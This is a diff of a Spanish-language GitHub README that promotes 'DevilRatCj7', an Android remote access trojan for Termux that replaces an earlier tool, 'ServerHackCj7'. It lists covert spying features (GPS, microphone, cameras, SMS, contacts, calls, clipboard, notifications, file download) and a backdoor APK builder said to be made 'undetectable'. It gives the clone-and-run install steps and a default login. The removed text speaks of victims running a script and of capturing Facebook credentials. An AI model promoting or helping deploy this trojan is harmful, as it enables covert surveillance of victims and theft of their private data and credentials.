@@ -24,19 +24,45 @@
 ## Menú Principal :
 ![Screenshot_20220618-165432_Termux](https://user-images.githubusercontent.com/81049859/174457351-fb28b1ef-d73e-492e-8524-785dc292400d.png)
 
-## Acceso Remoto al dispositivo :
+## Acceso Remoto :
 ![Screenshot_20220618-170423_Chrome](https://user-images.githubusercontent.com/81049859/174457409-90e26f4c-39bb-4bfa-b5e4-27c3290831e8.png)
+
+> ` User: juliocj7  && Pass: simplythebest `
 
 |Login|Build|Panel|
 |-----|-----|-----|
 |![Screenshot_20220618-170544_Chrome](https://user-images.githubusercontent.com/81049859/174457399-8a0eb9d4-4d86-4594-b43b-7c6eda7ecd39.png)|![Screenshot_20220618-165916_Chrome](https://user-images.githubusercontent.com/81049859/174457395-ecfac5fe-0e38-4eef-9600-2f097d324d13.png)|![Screenshot_20220618-170207_Chrome](https://user-images.githubusercontent.com/81049859/174457403-d8ee86fc-84af-43e6-93b9-996331d0f142.png)|
 
-## ServerHackCj7 :
-* La víctima debe ejecutar **sólo una vez el script** y obtendrás acceso a su dispositivo mediante un **servidor HTTPS** redirigido por conexiones TCP.
-* **Acceso libre** al directorio Home, a la memoria interna y también a la memoria externa (si la tiene insertada).
-* **Acceso total** de la raíz (si la víctima es un usuario root).
-* Descarga **archivos y directorios completos** de la víctima de una manera rápida, fácil y sencilla.
-* Si el ataque sigue su curso se logrará capturar también las **credenciales** de FACEBOOK.
+## Uso:
+
+* ` devilratcj7 login   Cambiar user:pass `
+* ` devilratcj7 start   Iniciar servidor `
+* ` devilratcj7 stop    Detener servidor `
+
+## Características :
+
+* [x] Registro de GPS (geolocalización)
+* [x] Grabación de micrófono
+* [x] Ver registro de contactos
+* [x] Ver registro de SMS (inbox/sent)
+* [x] Permite enviar SMS
+* [x] Ver registro de llamadas
+* [x] Ver aplicaciones instaladas
+* [x] Ver permisos de resguardo
+* [x] Registro en vivo del portapapeles
+* [x] Registro de notificaciones en vivo
+* [x] Ver características de la red WiFi
+* [x] Explorador y descargador de archivos
+* [x] Captura y grabador de pantalla
+* [x] Grabadora de cámara frontal y trasera
+* [x] Dispositivo de bloqueo
+* [x] Creador de APK incorporado
+
+## DevilRatCj7 :
+* Adaptación **actualizada 100% funcional** de L3mon Remote Access Troyan al entorno de Termux.
+* Obtén acceso y **control total a un dispositivo** mediante un Troyano de Acceso Remoto.
+* Generador automático de backdoor para android que construye, firma, alinea y verifica para hacerla indetectable.
+* Sólo el acceso al registro de mensajes, llamadas, contactos, archivos, notificaciones, etc da TODO UN MUNDO de posibilidades... así que a disfrutar!!!
 * Contenido, código, diseño y demás, pertenecen plena y totalmente a mí :sunglasses:
 - > ` By: ⍣᭕ᬁ᭖JulioCj7᭖᭕ᬁ⍣ `
 
@@ -51,13 +77,13 @@ https://github.com/Juliocj7/UtilsCj7
 ```bash
   yes|pkg update && pkg upgrade
 ```
-* `git clone https://github.com/Juliocj7/ServerHackCj7`
+* `git clone https://github.com/Juliocj7/DevilRatCj7`
 
-* `cd ServerHackCj7`
+* `cd DevilRatCj7`
 
 * `chmod +x *`
 
-* `./ServerHackCj7`
+* `./DevilRatCj7`
 
 ---
 ###### `Pd: Porfavor informar cualquier error`
